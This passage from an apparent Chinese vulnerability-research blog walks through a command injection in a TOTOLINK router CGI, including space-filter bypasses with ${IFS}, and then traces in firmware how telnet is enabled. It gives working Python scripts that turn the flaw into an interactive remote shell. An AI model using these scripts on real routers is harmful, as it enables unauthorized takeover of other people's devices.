+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">在浏览器中输入以下链接，<span class="variable">$&#123;IFS&#125;</span>中的IFS是linux系统的一个变量，用这种方式可以生成一个空格，可绕过字符串传输过程中对空格的过滤</span></span><br><span class="line">http://192.168.55.1/cgi-bin/downloadFlile.cgi?a=b;ls$&#123;IFS&#125;-al;</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">返回如下，将路由器中的目录及文件信息打印了出来</span></span><br><span class="line">QUERY_STRING:a=b</span><br><span class="line">drwxr-xr-x    3 root     root            0 Jan  1  1970 .</span><br><span class="line">drwxr-xr-x   10 root     root            0 Jan  1  1970 ..</span><br><span class="line">drwxr-xr-x    6 root     root            0 Jan  1  1970 .svn</span><br><span class="line">-rwxr-xr-x    1 root     root          402 Jan  1  1970 ExportSettings.sh</span><br><span class="line">-rwxr-xr-x    1 root     root          383 Jan  1  1970 ExportSyslog.sh</span><br><span class="line">-rwxr-xr-x    1 root     root         8007 Jan  1  1970 cstecgi.cgi</span><br><span class="line">-rwxr-xr-x    1 root     root         9015 Jan  1  1970 downloadFlile.cgi</span><br><span class="line">-rwxr-xr-x    1 root     root        16855 Jan  1  1970 upload.cgi</span><br><span class="line">-rwxr-xr-x    1 root     root        13671 Jan  1  1970 upload_bootloader.cgi</span><br><span class="line">-rwxr-xr-x    1 root     root        12503 Jan  1  1970 upload_settings.cgi</span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="使用pwntools完成利用脚本"   >
+          <a href="#使用pwntools完成利用脚本" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用pwntools完成利用脚本" class="headerlink" title="使用pwntools完成利用脚本"></a>使用pwntools完成利用脚本</h3>
+      <p>burpsuite中抓包如下，通过改变url中两个<code>;</code>之间的命令（也可用其他有效分隔符），可以实现命令注入，并将命令执行结果返回（<code>lighthttpd</code>的特性，把cgi运行的结果用于返回）。</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;cgi-bin&#x2F;downloadFlile.cgi?a&#x3D;b;ls$&#123;IFS&#125;-al; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.55.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko&#x2F;20100101 Firefox&#x2F;61.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-GB,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br></pre></td></tr></table></div></figure>
+<p>利用python脚本，将以上过程封装成shell形式</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(log_level=&quot;debug&quot;)</span></span><br><span class="line"></span><br><span class="line">msg1 = <span class="string">&quot;GET /cgi-bin/downloadFlile.cgi?&quot;</span></span><br><span class="line">msg2 = <span class="string">&quot; HTTP/1.1\r\n&quot;</span></span><br><span class="line">msg2 += <span class="string">&quot;Host: 192.168.55.1\r\n&quot;</span></span><br><span class="line">msg2 += <span class="string">&quot;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\r\n&quot;</span></span><br><span class="line">msg2 += <span class="string">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;</span></span><br><span class="line">msg2 += <span class="string">&quot;Accept-Language: en-GB,en;q=0.5\r\n&quot;</span></span><br><span class="line">msg2 += <span class="string">&quot;Accept-Encoding: gzip, deflate\r\n&quot;</span></span><br><span class="line">msg2 += <span class="string">&quot;Connection: close\r\n&quot;</span></span><br><span class="line">msg2 += <span class="string">&quot;Upgrade-Insecure-Requests: 1\r\n&quot;</span></span><br><span class="line">msg2 += <span class="string">&quot;Cache-Control: max-age=0\r\n&quot;</span></span><br><span class="line">msg2 += <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Hello, welcome to magic TOTOLINK shell!&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;You can use it like a linux shell&quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Enjoy it yourself now~&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;$ &quot;</span>,</span><br><span class="line">        a = raw_input()</span><br><span class="line">        b = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">                b += <span class="string">&quot;$&#123;IFS&#125;&quot;</span></span><br><span class="line">            <span class="keyword">elif</span>(i == <span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                b += i</span><br><span class="line">        in_cmd = <span class="string">&quot;aabbcc;&quot;</span>+b+<span class="string">&quot;;&quot;</span></span><br><span class="line">        msg_send = msg1 + in_cmd + msg2</span><br><span class="line">        <span class="comment"># print msg_send</span></span><br><span class="line">        io = remote(<span class="string">&quot;192.168.55.1&quot;</span>,<span class="number">80</span>)</span><br><span class="line">        io.send(msg_send)</span><br><span class="line">        test_msg = io.recvuntil(<span class="string">&quot;aabbcc\n&quot;</span>)</span><br><span class="line">        recv_msg = io.recv()</span><br><span class="line">        <span class="built_in">print</span> recv_msg</span><br><span class="line">        io.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="使用requests完成利用脚本"   >
+          <a href="#使用requests完成利用脚本" class="heading-link"><i class="fas fa-link"></i></a><a href="#使用requests完成利用脚本" class="headerlink" title="使用requests完成利用脚本"></a>使用requests完成利用脚本</h3>
+      <p>最终的脚本如下：</p>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">msg1 = <span class="string">&#x27;aabb;&#x27;</span></span><br><span class="line">msg2 = <span class="string">&#x27;;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;$&#x27;</span>,</span><br><span class="line">    a = raw_input()</span><br><span class="line">    b = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">            b += <span class="string">&quot;$IFS$1&quot;</span></span><br><span class="line">        <span class="keyword">elif</span>(i == <span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b += i</span><br><span class="line">    msg3 = msg1 + b + msg2</span><br><span class="line"></span><br><span class="line">    response = requests.get(<span class="string">&quot;http://192.168.55.1/cgi-bin/downloadFlile.cgi&quot;</span>,params=msg3)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> response.text.replace(<span class="string">&quot;QUERY_STRING:aabb&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></div></figure>
+<p>这个过程中，遇到了以下问题：</p>
+<p>1、如何用python中request模块来发包？</p>
+<p>参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_37616069/article/details/80376776" >python——Request模块</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>2、使用<code>response = requests.get(&quot;http://192.168.55.1/cgi-bin/downloadFlile.cgi?aabb;ls$&#123;IFS&#125;-al;&quot;)</code>无法成功得到返回值？</p>
+<p>第一步，定位问题。</p>
+<p>request.get()发包会自动将’{ }’进行编码，使用wireshark抓包查看如下。</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;cgi-bin&#x2F;downloadFlile.cgi?aabb;ls$%7BIFS%7D-al; HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.55.1</span><br></pre></td></tr></table></div></figure>
+<p>而服务端漏洞触发点还未到解码的位置，导致<code>system(ls$%7BIFS%7D-al)</code>无法被当做bash命令执行。</p>
+<p>第二步，寻找解决方案。</p>
+<p>a）尝试关闭requests.get()发包自动编码的功能，google查询一通后，发现除了改requests源码无其他办法。故放弃。</p>
+<p>b）尝试搜索”IFS 命令注入”，寻找是否有其他的方法达到<code>$&#123;IFS&#125;</code>同样的效果。果然！在<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://uuzdaisuki.com/2020/07/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" >命令注入绕过方式总结</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>这篇文章中找到了办法，如下。</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">##空格绕过###</span></span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">&#123;IFS&#125;flag.txt</span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">IFS<span class="variable">$1flag</span>.txt</span></span><br><span class="line"><span class="meta">cat$</span><span class="bash">&#123;IFS&#125;<span class="variable">$1flag</span>.txt</span></span><br></pre></td></tr></table></div></figure>
+<p>shell中$0,$1,$?等都是特殊变量，在shell中<code>echo $0 $1 $2 &#39;a&#39;</code>，可观察到<code>$1</code>和<code>$2</code>为空，<code>$0</code>为bash，其实是因为起bash时其参数为空。详细参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/zhuandshao/p/7193564.html" >shell编程学习笔记之特殊变量</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>。</p>
+<p>3、python字符串的操作不熟悉</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; dir(<span class="string">&#x27;aaa&#x27;</span>)</span></span><br><span class="line">[&#x27;__add__&#x27;, &#x27;__class__&#x27;, &#x27;__contains__&#x27;, &#x27;__delattr__&#x27;, &#x27;__doc__&#x27;, &#x27;__eq__&#x27;, &#x27;__format__&#x27;, &#x27;__ge__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__getitem__&#x27;, &#x27;__getnewargs__&#x27;, &#x27;__getslice__&#x27;, &#x27;__gt__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__le__&#x27;, &#x27;__len__&#x27;, &#x27;__lt__&#x27;, &#x27;__mod__&#x27;, &#x27;__mul__&#x27;, &#x27;__ne__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__rmod__&#x27;, &#x27;__rmul__&#x27;, &#x27;__setattr__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;_formatter_field_name_split&#x27;, &#x27;_formatter_parser&#x27;, &#x27;capitalize&#x27;, &#x27;center&#x27;, &#x27;count&#x27;, &#x27;decode&#x27;, &#x27;encode&#x27;, &#x27;endswith&#x27;, &#x27;expandtabs&#x27;, &#x27;find&#x27;, &#x27;format&#x27;, &#x27;index&#x27;, &#x27;isalnum&#x27;, &#x27;isalpha&#x27;, &#x27;isdigit&#x27;, &#x27;islower&#x27;, &#x27;isspace&#x27;, &#x27;istitle&#x27;, &#x27;isupper&#x27;, &#x27;join&#x27;, &#x27;ljust&#x27;, &#x27;lower&#x27;, &#x27;lstrip&#x27;, &#x27;partition&#x27;, &#x27;replace&#x27;, &#x27;rfind&#x27;, &#x27;rindex&#x27;, &#x27;rjust&#x27;, &#x27;rpartition&#x27;, &#x27;rsplit&#x27;, &#x27;rstrip&#x27;, &#x27;split&#x27;, &#x27;splitlines&#x27;, &#x27;startswith&#x27;, &#x27;strip&#x27;, &#x27;swapcase&#x27;, &#x27;title&#x27;, &#x27;translate&#x27;, &#x27;upper&#x27;, &#x27;zfill&#x27;]</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; <span class="built_in">help</span>(<span class="string">&#x27;&#x27;</span>.replace)</span></span><br></pre></td></tr></table></div></figure>
+<p><strong>！！！彩蛋！！！</strong></p>
+<blockquote>
+<p>精简版的exp</p>
+</blockquote>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;$&#x27;</span>,</span><br><span class="line">    a = <span class="string">&#x27;aabb;&#x27;</span> + raw_input().replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;$IFS$1&#x27;</span>) + <span class="string">&#x27;;&#x27;</span></span><br><span class="line">    response = requests.get(<span class="string">&quot;http://192.168.55.1/cgi-bin/downloadFlile.cgi&quot;</span>,params=a)</span><br><span class="line">    <span class="built_in">print</span> response.text.replace(<span class="string">&quot;QUERY_STRING:aabb&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></div></figure>
+
+        <h1 id="业务分析-where-is-telnet"   >
+          <a href="#业务分析-where-is-telnet" class="heading-link"><i class="fas fa-link"></i></a><a href="#业务分析-where-is-telnet" class="headerlink" title="业务分析 - where is telnet ?"></a>业务分析 - where is telnet ?</h1>
+      <p>虽然上一步骤中实现了任意开关telnet，但作为一个案例，还是想一探究竟固件中真正去做开关动作的函数在哪儿。于是有了这一小节的内容。</p>
+<p>首先，分析我们抓到的设置telnet的http包：</p>
+<figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;cgi-bin&#x2F;cstecgi.cgi HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.55.1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko&#x2F;20100101 Firefox&#x2F;61.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en-GB,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.55.1&#x2F;telnet.asp</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded; charset&#x3D;UTF-8</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Content-Length: 56</span><br><span class="line">Cookie: SESSION_ID&#x3D;2:1516628334:2</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;topicurl&quot;:&quot;setting&#x2F;setTelnetCfg&quot;,&quot;telnet_enabled&quot;:&quot;1&quot;&#125;</span><br></pre></td></tr></table></div></figure>
+<p><strong>1、在cstecgi.cgi中寻找setTelnetCfg和telnet_enable</strong></p>
+<p>IDA中对<code>cstecgi.cgi</code>文件搜索了一番，并未找到任何线索。</p>
+<p><strong>2、尝试全局搜索</strong></p>
+<p>全局搜索字符串”telnet_enable”和”setTelnetCfg”</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">squashfs-root$</span><span class="bash"> grep -rin telnet_enabled</span></span><br><span class="line">web_cste/telnet.asp:16:         supplyValue(&quot;telnet_enabled&quot;,rJson[&#x27;telnet_enabled&#x27;]);</span><br><span class="line">web_cste/telnet.asp:23: postVar[&#x27;telnet_enabled&#x27;]=$(&#x27;#telnet_enabled&#x27;).val();</span><br><span class="line">web_cste/telnet.asp:38:&lt;td&gt;&lt;select class=&quot;select&quot; id=&quot;telnet_enabled&quot;&gt;</span><br><span class="line">Binary file lib/cste_modules/system.so matches</span><br><span class="line">Binary file lib/libapmib.so matches</span><br><span class="line"><span class="meta">squashfs-root$</span><span class="bash"> grep -rin setTelnetCfg</span></span><br><span class="line">web_cste/telnet.asp:22: var postVar=&#123;&quot;topicurl&quot; : &quot;setting/setTelnetCfg&quot;&#125;;</span><br><span class="line">Binary file lib/cste_modules/system.so matches</span><br></pre></td></tr></table></div></figure>
+<p>telnet.asp是前端用来构造http包的，因此无需关注。重点在lib/下的两个.so文件。逐个分析：</p>
+<p>1）lib/libapmib.so</p>
+<p>在IDA中对libapmib.so进行分析，找到了”telnet_enable”字符串，然而并未找到引用位置。暂定该so文件不是分析的目标。</p>
+<p>2）lib/cste_modules/system.so</p>
+<p>在system.so中找到两处对字符串”telnet_enable”的引用，一处是<code>getTelnetCfg()</code>，另一处是<code>setTelnetCfg()</code>。通过名字就能看出后一个设置telnet是我们要的函数！其源码逻辑如下：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">setTelnetCfg</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> v7[<span class="number">3</span>]; <span class="comment">// [sp+18h] [-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5 = (<span class="keyword">const</span> <span class="keyword">char</span> *)websGetVar(a2, <span class="string">&quot;telnet_enabled&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">  v7[<span class="number">0</span>] = atoi(v5);</span><br><span class="line">  apmib_set(<span class="number">0x4683</span>, v7);</span><br><span class="line">  <span class="keyword">if</span> ( v7[<span class="number">0</span>] == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;killall telnetd 2&gt; /dev/null&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;telnetd &amp;&quot;</span>);            <span class="comment">//这一行开启了telnetd进程</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;killall telnetd 2&gt; /dev/null&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  apmib_update_web(<span class="number">4</span>);</span><br><span class="line">  <span class="keyword">return</span> websSetCfgResponse(a1, a3, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;reserv&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p>继续跟踪是谁调用了这个函数，跟踪到了system.so中的module_init()函数。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">module_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  cste_hook_register(<span class="string">&quot;getPasswordCfg&quot;</span>, getPasswordCfg);</span><br><span class="line">  cste_hook_register(<span class="string">&quot;setPasswordCfg&quot;</span>, setPasswordCfg);</span><br><span class="line">  cste_hook_register(<span class="string">&quot;NTPSyncWithHost&quot;</span>, NTPSyncWithHost);</span><br><span class="line">  cste_hook_register(<span class="string">&quot;getNTPCfg&quot;</span>, &amp;getNTPCfg);</span><br><span class="line">  cste_hook_register(<span class="string">&quot;setNTPCfg&quot;</span>, setNTPCfg);</span><br><span class="line">  cste_hook_register(<span class="string">&quot;getDDNSStatus&quot;</span>, getDDNSStatus);</span><br><span class="line">  cste_hook_register(<span class="string">&quot;getDDNSCfg&quot;</span>, &amp;getDDNSCfg);</span><br><span class="line">  cste_hook_register(<span class="string">&quot;setDDNSCfg&quot;</span>, setDDNSCfg);</span><br><span class="line">  cste_hook_register(<span class="string">&quot;getSyslogCfg&quot;</span>, &amp;getSyslogCfg);</span><br><span class="line">  cste_hook_register(<span class="string">&quot;clearSyslog&quot;</span>, clearSyslog);</span><br><span class="line">  cste_hook_register(<span class="string">&quot;setSyslogCfg&quot;</span>, setSyslogCfg);</span><br><span class="line">  cste_hook_register(<span class="string">&quot;getMiniUPnPConfig&quot;</span>, &amp;getMiniUPnPConfig);</span><br><span class="line">  cste_hook_register(<span class="string">&quot;setMiniUPnPConfig&quot;</span>, setMiniUPnPConfig);</span><br><span class="line">  cste_hook_register(<span class="string">&quot;LoadDefSettings&quot;</span>, LoadDefSettings);</span><br><span class="line">  cste_hook_register(<span class="string">&quot;RebootSystem&quot;</span>, RebootSystem);</span><br><span class="line">  cste_hook_register(<span class="string">&quot;FirmwareUpgrade&quot;</span>, FirmwareUpgrade);</span><br><span class="line">  cste_hook_register(<span class="string">&quot;getRebootScheCfg&quot;</span>, getRebootScheCfg);</span><br><span class="line">  cste_hook_register(<span class="string">&quot;setRebootScheCfg&quot;</span>, setRebootScheCfg);</span><br><span class="line">  cste_hook_register(<span class="string">&quot;getTelnetCfg&quot;</span>, getTelnetCfg);</span><br><span class="line">  cste_hook_register(<span class="string">&quot;setTelnetCfg&quot;</span>, setTelnetCfg);             <span class="comment">//在这里注册了setTelnetCfg，但是谁调用了这儿呢？</span></span><br><span class="line">  cste_hook_register(<span class="string">&quot;SystemSettings&quot;</span>, SystemSettings);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+<p><strong>3、整理思路</strong></p>
+<p>现在已知服务器端（路由器）处理设置telnet http包的入口是<code>cstecgi.cgi</code>，最终执行设置telnet的动作是在system.so中，且字符串<code>setTelnetCfg</code>仅能在这两个文件中搜索到。</p>
+<p>在分析完<code>cstecgi.cgi</code>源码后，并未找到对system.so的调用。到这里，发现两者的联系断了！但是它们又不可能是断的，说明有一个中间件，可以将他们二者联系起来。那么有了以下分析过程：</p>
+<p>1）这个中间件肯定会调用system.so，那么二进制中一定有这个字符串。于是尝试全局搜索字符串’system.so’，But，结果为空，啥也没搜到。怎么回事呢？</p>
+<p>2）据说还有一种加载so文件的方式，那就是通过<code>dlopen(const char *filename, int flags)</code>。不过，dlopen打开so文件是需要制定路径+so文件名的，而我们刚刚搜索so文件名的结果为空，说明源码中可能对路径和文件名进行了拼接。尝试找一下路径字符串。</p>
+<p><strong>4、寻找对so文件所在路径的引用</strong></p>
+<p>对于<code>lib/cste_modules/system.so</code>，我们尝试搜索路径字符串”lib/cste_modules”，结果如下：</p>
+<figure class="highlight shell"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">squashfs-root$</span><span class="bash"> grep -rin dlopen</span></span><br><span class="line">Binary file lib/libpthread-0.9.33.so matches</span><br><span class="line">Binary file lib/libcrypto.so.0.9.8 matches</span><br><span class="line">Binary file lib/libdl-0.9.33.so matches</span><br><span class="line">Binary file lib/librt-0.9.33.so matches</span><br><span class="line">Binary file bin/cs_broker matches</span><br><span class="line">Binary file bin/cste_sub matches        #满足dlopen</span><br><span class="line">Binary file bin/lighttpd matches</span><br><span class="line">Binary file bin/tc matches</span><br><span class="line"><span class="meta">squashfs-root$</span><span class="bash"> grep -rin lib/cste_modules</span></span><br><span class="line">Binary file bin/cste_sub matches        #满足lib/cste_modules路径</span><br></pre></td></tr></table></div></figure>
+<p>根据搜索结果，锁定到<code>bin/cste_sub</code>这个二进制文件。IDA打开该文件，在函数窗口搜索dlopen，定位到唯一一处对该函数的引用：</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">load_modules</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line">  v0 = opendir(&amp;dword_4037B0);      <span class="comment">//dword_4037B0处存放的数据其ASCII编码对应&quot;/lib/cste_modules/&quot;</span></span><br><span class="line">  ...</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = readdir(v0);         <span class="comment">//while循环中，从&quot;/lib/cste_modules/&quot;目录将每个文件名依次取出</span></span><br><span class="line">      v8 = v7;</span><br><span class="line">      <span class="keyword">if</span> ( !v7 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v3 = v7 + <span class="number">11</span>;             <span class="comment">// 